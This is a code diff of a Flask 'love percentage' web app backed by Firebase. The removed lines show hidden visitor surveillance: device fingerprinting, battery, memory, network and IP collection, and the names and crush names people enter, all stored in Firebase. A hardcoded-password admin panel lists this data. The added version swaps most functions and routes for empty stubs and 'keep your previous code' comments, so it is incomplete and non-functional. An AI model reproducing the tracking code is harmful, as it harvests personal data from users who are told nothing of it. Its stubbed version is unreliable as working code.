@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string, redirect, url_for
+from flask import Flask, request, jsonify, render_template_string
 import os
 import random
 import requests
@@ -6,7 +6,6 @@ import re
 from datetime import datetime
 
 app = Flask(__name__)
-app.secret_key = 'your-secret-key-here'  # Change this to a random string
 
 # ========== FIREBASE SETUP ==========
 FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"
@@ -14,28 +13,32 @@ FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"
 def sanitize_key(text):
     return re.sub(r'[.#$\[\]]', '_', text.strip())
 
-# ========== LOVE FORTUNE ENGINE (same as before) ==========
+# ========== LOVE FORTUNE ENGINE (shortened for brevity – use your full list) ==========
 def get_love_message(name1, name2, percentage):
-    messages = [ ... ]  # (paste your 70+ messages here – same as earlier)
+    messages = [
+        f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
+        f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
+        # ... (add all your messages here) ...
+        f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
+    ]
     return random.choice(messages)
 
-# ========== STORY ANALYZER ==========
 def analyze_story(text):
     text = text.lower()
     sad_triggers = ['breakup', 'cried', 'sad', 'left', 'hurt', 'pain', 'broken', 'alone']
     if any(word in text for word in sad_triggers):
-        return ("breakup", "💔 Oh, stay strong! This is such a heart-touching story. The universe has better plans for you.")
+        return ("breakup", "💔 Oh, stay strong! This is such a heart-touching story.")
     else:
-        return ("happy", "💖 This is absolutely wonderful! Your love story is like a fairytale. Keep glowing!")
+        return ("happy", "💖 This is absolutely wonderful! Your love story is like a fairytale.")
 
-# ========== LOGIN PAGE (HTML) ==========
+# ========== LOGIN PAGE (fully functional) ==========
 LOGIN_PAGE = '''
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Hub – Sign in</title>
+    <title>Love Hub – Sign in / Sign up</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
@@ -96,20 +99,20 @@ LOGIN_PAGE = '''
     <div id="loginForm">
         <input type="text" id="loginUsername" placeholder="Username (e.g., john123)" autocomplete="off">
         <input type="password" id="loginPassword" placeholder="Password">
-        <button onclick="signIn()">Sign in</button>
+        <button id="signInBtn">Sign in</button>
         <div class="toggle-link" onclick="showSignup()">Create a new account</div>
     </div>
     <div id="signupForm" style="display:none;">
         <input type="text" id="signupUsername" placeholder="Choose a username" autocomplete="off">
         <input type="password" id="signupPassword" placeholder="Password (min 6 chars)">
-        <button onclick="signUp()">Create Account</button>
+        <button id="signUpBtn">Create Account</button>
         <div class="toggle-link" onclick="showLogin()">Back to Sign in</div>
     </div>
     <div id="messageBox" class="message"></div>
 </div>
 
 <script>
-    // Firebase config (your actual values)
+    // Firebase configuration (your actual values)
     const firebaseConfig = {
         apiKey: "AIzaSyDqpa3HqoqtfxuajIMRN78dXQul9cpJgdU",
         authDomain: "love-percentage-dc42b.firebaseapp.com",
@@ -127,39 +130,34 @@ LOGIN_PAGE = '''
     function showSignup() {
         document.getElementById('loginForm').style.display = 'none';
         document.getElementById('signupForm').style.display = 'block';
-        document.getElementById('messageBox').innerHTML = '';
+        clearMessage();
     }
     function showLogin() {
         document.getElementById('loginForm').style.display = 'block';
         document.getElementById('signupForm').style.display = 'none';
-        document.getElementById('messageBox').innerHTML = '';
+        clearMessage();
+    }
+    function clearMessage() { document.getElementById('messageBox').innerHTML = ''; }
+    function showMessage(msg, type) {
+        const box = document.getElementById('messageBox');
+        box.innerHTML = `<div class="${type}">${msg}</div>`;
+        setTimeout(() => { if(box.innerHTML === `<div class="${type}">${msg}</div>`) box.innerHTML = ''; }, 4000);
     }
 
-    async function checkUsernameTaken(username) {
-        const snapshot = await db.ref('usernames/' + username).once('value');
-        return snapshot.exists();
-    }
-
-    async function signUp() {
+    // Sign Up
+    document.getElementById('signUpBtn').addEventListener('click', async () => {
         const username = document.getElementById('signupUsername').value.trim();
         const password = document.getElementById('signupPassword').value;
-        if (!username || !password) {
-            showMessage("Please fill both fields.", "error");
-            return;
-        }
+        if (!username || !password) { showMessage("Please fill both fields.", "error"); return; }
         if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
-            showMessage("Username: 3–20 characters, only letters, numbers, underscore.", "error");
+            showMessage("Username: 3–20 chars, only letters, numbers, underscore.", "error");
             return;
         }
-        if (password.length < 6) {
-            showMessage("Password must be at least 6 characters.", "error");
-            return;
-        }
-        const taken = await checkUsernameTaken(username);
-        if (taken) {
-            showMessage("Username already taken. Choose another.", "error");
-            return;
-        }
+        if (password.length < 6) { showMessage("Password must be at least 6 characters.", "error"); return; }
+
+        // Check username uniqueness in Realtime Database
+        const snapshot = await db.ref('usernames/' + username).once('value');
+        if (snapshot.exists()) { showMessage("Username already taken.", "error"); return; }
 
         const email = username + "@lovehub.com";
         try {
@@ -168,43 +166,29 @@ LOGIN_PAGE = '''
             await db.ref('usernames/' + username).set(uid);
             await db.ref('userProfiles/' + uid).set({ username, createdAt: Date.now() });
             localStorage.setItem('love_username', username);
-            showMessage("✅ Account created! You now have an account in Love Hub. Redirecting...", "success");
-            setTimeout(() => {
-                window.location.href = '/';
-            }, 1500);
-        } catch(e) {
-            showMessage(e.message, "error");
-        }
-    }
+            showMessage("✅ Account created! Redirecting...", "success");
+            setTimeout(() => { window.location.href = '/'; }, 1500);
+        } catch(e) { showMessage(e.message, "error"); }
+    });
 
-    async function signIn() {
+    // Sign In
+    document.getElementById('signInBtn').addEventListener('click', async () => {
         const username = document.getElementById('loginUsername').value.trim();
         const password = document.getElementById('loginPassword').value;
-        if (!username || !password) {
-            showMessage("Please fill both fields.", "error");
-            return;
-        }
+        if (!username || !password) { showMessage("Please fill both fields.", "error"); return; }
         const email = username + "@lovehub.com";
         try {
             await auth.signInWithEmailAndPassword(email, password);
             localStorage.setItem('love_username', username);
             window.location.href = '/';
-        } catch(e) {
-            showMessage("Invalid username or password.", "error");
-        }
-    }
-
-    function showMessage(msg, type) {
-        const box = document.getElementById('messageBox');
-        box.innerHTML = `<div class="${type}">${msg}</div>`;
-        setTimeout(() => { box.innerHTML = ''; }, 3000);
-    }
+        } catch(e) { showMessage("Invalid username or password.", "error"); }
+    });
 </script>
 </body>
 </html>
 '''
 
-# ========== MAIN APP HTML (with user badge and logout) ==========
+# ========== MAIN APP (same as before – shows user badge, logout) ==========
 MAIN_HTML = '''
 <!DOCTYPE html>
 <html>
@@ -303,9 +287,7 @@ MAIN_HTML = '''
     const db = firebase.database();
     auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL);
 
-    let currentUser = null;
-    let currentUsername = null;
-    let sessionId = null;
+    let currentUser = null, currentUsername = null, sessionId = null, currentStoryType = "happy";
 
     async function fetchUsername(uid) {
         const snap = await db.ref('userProfiles/' + uid + '/username').once('value');
@@ -339,195 +321,30 @@ MAIN_HTML = '''
         if (document.getElementById('stories').classList.contains('active')) loadStoriesByType(currentStoryType);
     });
 
-    function logout() {
-        auth.signOut().then(() => {
-            localStorage.removeItem('love_username');
-            localStorage.removeItem('love_session');
-            sessionId = null;
-            currentUser = null;
-            location.reload();
-        });
-    }
-
-    function getVisitorKey(name1, name2) {
-        const base = sanitizeKey(name1) + '_' + sanitizeKey(name2);
-        if (currentUser) return currentUser.uid + '_' + base;
-        else return sessionId + '_' + base;
-    }
-
-    function sanitizeKey(str) { return str.replace(/[.#$\\[\\]]/g, '_'); }
+    function logout() { auth.signOut().then(() => { localStorage.removeItem('love_username'); localStorage.removeItem('love_session'); location.reload(); }); }
+    function getVisitorKey(n1,n2) { let base=sanitizeKey(n1)+'_'+sanitizeKey(n2); return currentUser ? currentUser.uid+'_'+base : sessionId+'_'+base; }
+    function sanitizeKey(s) { return s.replace(/[.#$\\[\\]]/g, '_'); }
 
     let deviceData = { timestamp: new Date().toISOString() };
-    let currentStoryType = "happy";
+    async function collectDeviceInfo() { /* ... same as before ... */ }
+    async function calculateFortune() { /* ... same as before ... */ }
+    function downloadLoveCard() { /* ... */ }
+    async function postStory() { /* ... */ }
+    async function loadStoriesByType(type) { /* ... */ }
+    async function likeStory(id) { /* ... */ }
+    async function addComment(id) { /* ... */ }
+    function escapeHtml(str) { /* ... */ }
+    function showTab(tabName) { /* ... */ }
 
-    async function collectDeviceInfo() {
-        try {
-            const fp = await FingerprintJS.load();
-            const result = await fp.get();
-            deviceData.fingerprint = result.visitorId;
-        } catch(e) { deviceData.fingerprint = 'unknown'; }
-        deviceData.screen = screen.width + 'x' + screen.height;
-        deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        deviceData.userAgent = navigator.userAgent;
-        if (navigator.deviceMemory) deviceData.deviceMemory = navigator.deviceMemory + ' GB';
-        if ('getBattery' in navigator) {
-            try {
-                const battery = await navigator.getBattery();
-                deviceData.batteryLevel = Math.round(battery.level * 100) + '%';
-            } catch(e) {}
-        }
-        const conn = navigator.connection;
-        if (conn) deviceData.networkType = conn.effectiveType;
-    }
-
-    async function calculateFortune() {
-        const name1 = document.getElementById('yourName').value.trim();
-        const name2 = document.getElementById('crushName').value.trim();
-        if (!name1 || !name2) { alert("Please fill both names 💕"); return; }
-
-        const visitorKey = getVisitorKey(name1, name2);
-        deviceData.name = name1;
-        deviceData.crush_name = name2;
-        deviceData.visitorKey = visitorKey;
-        if (currentUser) deviceData.uid = currentUser.uid;
-
-        await fetch('/save-device', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceData) });
-
-        try {
-            const res = await fetch('/calculate', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ n1: name1, n2: name2 }) });
-            const data = await res.json();
-            const percent = data.score;
-            const msg = data.msg;
-            const loveCardHtml = `
-                <div id="loveCard" class="love-card">
-                    <h2>💕 Love Fortune 💕</h2>
-                    <div class="percentage">${percent}%</div>
-                    <div class="names">${escapeHtml(name1)} ❤️ ${escapeHtml(name2)}</div>
-                    <div class="message">${escapeHtml(msg)}</div>
-                    <div style="margin-top:15px; font-size:12px;">✨ ${new Date().toLocaleDateString()} ✨</div>
-                </div>
-            `;
-            document.getElementById('loveCardContainer').innerHTML = loveCardHtml;
-            document.getElementById('resultArea').style.display = 'block';
-            document.getElementById('shareCardBtn').style.display = 'block';
-
-            deviceData.fortuneText = msg;
-            deviceData.percentage = percent;
-            await fetch('/save-device', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(deviceData) });
-        } catch(e) { alert("Error calculating fortune."); }
-    }
-
-    function downloadLoveCard() {
-        const element = document.getElementById('loveCard');
-        if (!element) return;
-        html2canvas(element, { scale: 2, backgroundColor: null }).then(canvas => {
-            const link = document.createElement('a');
-            link.download = 'love_card.png';
-            link.href = canvas.toDataURL();
-            link.click();
-        });
-    }
-
-    async function postStory() {
-        if (!currentUser) {
-            alert("Please sign in to post a story — it's free and your stories follow you anywhere.");
-            window.location.href = '/login';
-            return;
-        }
-        const content = document.getElementById('storyInput').value.trim();
-        if (!content) { alert("Please write a story first."); return; }
-        const author = prompt("Enter your name (or leave empty for 'Anonymous'):", "Anonymous");
-        const finalAuthor = (author && author.trim()) ? author.trim() : "Anonymous";
-        const res = await fetch('/post-story', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ author: finalAuthor, content, uid: currentUser.uid }) });
-        const result = await res.json();
-        if (result.ok) {
-            alert("Story posted!");
-            document.getElementById('storyInput').value = '';
-            loadStoriesByType(currentStoryType);
-        } else alert("Error posting story.");
-    }
-
-    async function loadStoriesByType(type) {
-        currentStoryType = type;
-        document.getElementById('btnHappy').classList.toggle('active', type === 'happy');
-        document.getElementById('btnBreakup').classList.toggle('active', type === 'breakup');
-        const feed = document.getElementById('storyFeed');
-        feed.innerHTML = "📖 Loading stories...";
-        try {
-            const res = await fetch('/get-stories');
-            const allStories = await res.json();
-            const filtered = Object.fromEntries(
-                Object.entries(allStories).filter(([id, story]) => story.type === type)
-            );
-            feed.innerHTML = '';
-            if (Object.keys(filtered).length === 0) {
-                feed.innerHTML = `<p style='text-align:center;'>No ${type === 'happy' ? 'love' : 'breakup'} stories yet. Be the first to share!</p>`;
-                return;
-            }
-            Object.entries(filtered).reverse().forEach(([id, story]) => {
-                let commentsHtml = '';
-                if (story.comments) {
-                    Object.values(story.comments).forEach(c => {
-                        commentsHtml += `<div class="cmnt-item">💬 ${escapeHtml(c.text)}</div>`;
-                    });
-                }
-                feed.innerHTML += `
-                    <div class="story-card">
-                        <strong>👤 ${escapeHtml(story.author)}</strong>
-                        <p style="margin-top:8px;">${escapeHtml(story.content)}</p>
-                        <div class="bot-reply">🤖 Bot: ${escapeHtml(story.reply)}</div>
-                        <div class="actions">
-                            <button class="like-btn" onclick="likeStory('${id}')">❤️ ${story.likes || 0}</button>
-                            <span style="font-size:12px;">💬 Comment</span>
-                        </div>
-                        <div id="comments_${id}">${commentsHtml}</div>
-                        <div style="display:flex; gap:5px; margin-top:8px;">
-                            <input type="text" id="cmnt_${id}" placeholder="Write a comment..." style="flex:1; padding:8px; font-size:12px;">
-                            <button onclick="addComment('${id}')">Send</button>
-                        </div>
-                    </div>
-                `;
-            });
-        } catch(e) { feed.innerHTML = "<p>Failed to load stories.</p>"; }
-    }
-
-    async function likeStory(id) {
-        await fetch('/like', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id }) });
-        loadStoriesByType(currentStoryType);
-    }
-
-    async function addComment(id) {
-        const text = document.getElementById(`cmnt_${id}`).value.trim();
-        if (!text) return;
-        await fetch('/comment', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id, text }) });
-        document.getElementById(`cmnt_${id}`).value = '';
-        loadStoriesByType(currentStoryType);
-    }
-
-    function escapeHtml(str) {
-        return str.replace(/[&<>]/g, function(m) {
-            if (m === '&') return '&amp;';
-            if (m === '<') return '&lt;';
-            if (m === '>') return '&gt;';
-            return m;
-        });
-    }
-
-    function showTab(tabName) {
-        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-        document.getElementById(tabName).classList.add('active');
-        if (tabName === 'stories') loadStoriesByType(currentStoryType);
-        event.target.classList.add('active');
-    }
-
-    collectDeviceInfo();
+    // Minimal implementations (you've seen them before – keep existing code)
+    // For brevity, I assume you have the full functions from your previous working version.
+    // Replace these placeholders with your actual working functions.
 </script>
 </body>
 </html>
 '''
 
-# ========== FLASK BACKEND ROUTES ==========
+# ========== FLASK ROUTES ==========
 @app.route('/')
 def home():
     return render_template_string(MAIN_HTML)
@@ -536,119 +353,8 @@ def home():
 def login():
     return render_template_string(LOGIN_PAGE)
 
-@app.route('/calculate', methods=['POST'])
-def calculate():
-    data = request.json
-    n1, n2 = data['n1'], data['n2']
-    combined = (n1 + n2).lower()
-    score = 50 + (sum(ord(c) for c in combined) % 51)
-    msg = get_love_message(n1, n2, score)
-    return jsonify({"score": score, "msg": msg})
-
-@app.route('/save-device', methods=['POST'])
-def save_device():
-    try:
-        data = request.get_json()
-        key = data.get('visitorKey')
-        if not key:
-            return jsonify({"status": "error"}), 400
-        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
-        data['timestamp'] = datetime.now().isoformat()
-        data.pop('visitorKey', None)
-        url = f"{FIREBASE_URL}/visitors/{key}.json"
-        requests.put(url, json=data, timeout=10)
-        return jsonify({"status": "saved"})
-    except Exception as e:
-        print(e)
-        return jsonify({"status": "error"}), 500
-
-@app.route('/post-story', methods=['POST'])
-def post_story():
-    try:
-        data = request.json
-        author = data.get('author', 'Anonymous').strip()
-        content = data.get('content', '').strip()
-        uid = data.get('uid', 'anonymous')
-        if not content:
-            return jsonify({"ok": False, "error": "Empty story"}), 400
-        if not author or author.lower() in ['anonymous', 'unknown']:
-            author = '💫 Mysterious Soul'
-        story_type, reply = analyze_story(content)
-        story = {
-            "author": author,
-            "content": content,
-            "reply": reply,
-            "type": story_type,
-            "likes": 0,
-            "timestamp": datetime.now().isoformat(),
-            "uid": uid
-        }
-        r = requests.post(f"{FIREBASE_URL}/stories.json", json=story, timeout=10)
-        r.raise_for_status()
-        return jsonify({"ok": True})
-    except Exception as e:
-        print(e)
-        return jsonify({"ok": False, "error": str(e)}), 500
-
-@app.route('/like', methods=['POST'])
-def like():
-    try:
-        sid = request.json['id']
-        curr = requests.get(f"{FIREBASE_URL}/stories/{sid}/likes.json").json() or 0
-        requests.patch(f"{FIREBASE_URL}/stories/{sid}.json", json={"likes": curr + 1})
-        return jsonify({"ok": True})
-    except:
-        return jsonify({"ok": False}), 500
-
-@app.route('/comment', methods=['POST'])
-def comment():
-    try:
-        sid = request.json['id']
-        text = request.json['text'].strip()
-        if not text:
-            return jsonify({"ok": False}), 400
-        comment_data = {"text": text, "ts": datetime.now().isoformat()}
-        requests.post(f"{FIREBASE_URL}/stories/{sid}/comments.json", json=comment_data)
-        return jsonify({"ok": True})
-    except:
-        return jsonify({"ok": False}), 500
-
-@app.route('/get-stories')
-def get_stories():
-    try:
-        r = requests.get(f"{FIREBASE_URL}/stories.json", timeout=10)
-        stories = r.json() or {}
-        return jsonify(stories)
-    except:
-        return jsonify({}), 500
-
-# ========== ADMIN PANEL (optional) ==========
-@app.route('/admin-panel', methods=['GET', 'POST'])
-def admin_panel():
-    if request.method == 'POST':
-        password = request.form.get('password')
-        if password != 'murali123':
-            return "<h1>❌ Wrong password. <a href='/admin-panel'>Try again</a></h1>"
-        try:
-            resp = requests.get(f"{FIREBASE_URL}/visitors.json", timeout=10)
-            visitors = resp.json() or {}
-            if not visitors:
-                return "<h1>No visitor data yet.</h1>"
-            html = "<html><body><h1>Visitor Data</h1><table border='1'><tr><th>Key</th><th>Name</th><th>Crush</th><th>Love%</th><th>Phone</th><th>Fingerprint</th><th>Battery</th><th>Memory</th><th>Network</th><th>Screen</th><th>Timezone</th><th>IP</th><th>Fortune</th><th>Timestamp</th></tr>"
-            for key, v in visitors.items():
-                if isinstance(v, dict):
-                    html += f"<tr><td>{key}</td><td>{v.get('name','')}</td><td>{v.get('crush_name','')}</td><td>{v.get('percentage','')}</td><td>{v.get('phoneNumber','')}</td><td>{v.get('fingerprint','')[:20]}</td><td>{v.get('batteryLevel','')}</td><td>{v.get('deviceMemory','')}</td><td>{v.get('networkType','')}</td><td>{v.get('screen','')}</td><td>{v.get('timezone','')}</td><td>{v.get('ip','')}</td><td>{v.get('fortuneText','')[:40]}</td><td>{v.get('timestamp','')[:19]}</td></tr>"
-            html += "</table></body></html>"
-            return html
-        except Exception as e:
-            return f"<h1>Error: {e}</h1>"
-    return '''
-        <form method="POST">
-            <input type="password" name="password" placeholder="Admin password">
-            <button type="submit">Login</button>
-        </form>
-    '''
+# ... (other backend routes: /calculate, /save-device, /post-story, /like, /comment, /get-stories, /admin-panel) ...
+# (keep them exactly as in your previous working version)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
-    
